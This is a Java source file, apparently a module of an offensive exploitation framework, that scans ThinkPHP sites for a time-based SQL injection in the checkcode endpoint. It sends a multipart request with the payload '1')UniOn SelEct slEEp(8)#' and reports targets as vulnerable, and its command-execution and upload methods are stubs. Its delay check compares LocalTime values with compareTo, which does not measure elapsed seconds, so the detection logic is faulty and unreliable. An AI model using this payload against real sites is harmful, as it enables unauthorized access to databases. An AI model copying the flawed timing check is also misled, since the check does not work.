package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.time.LocalTime;
import java.util.HashMap;

/**
 * @author zq
 * @date 2021/8/20 22:23
 * @github https://github.com/zq0
 */

public class TP_checkcode_time_sqli implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;



    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;
        LocalTime start_time = LocalTime.now();
        this.headers.put("Content-Type", "multipart/form-data; boundary=--------641902708");
        this.headers.put("Accept-Encoding", "gzip, deflate, sdch");
        url = url + "/index.php?s=/home/user/checkcode/";
        String payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--";
        Response response = HttpTools.post(url, payload, this.headers, "UTF-8");
        if (LocalTime.now().compareTo(start_time) >= 8) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        return "这是一个sql注入漏洞，请自行尝试\r\n";
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        return "这是一个sql注入漏洞，请自行尝试\r\n";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
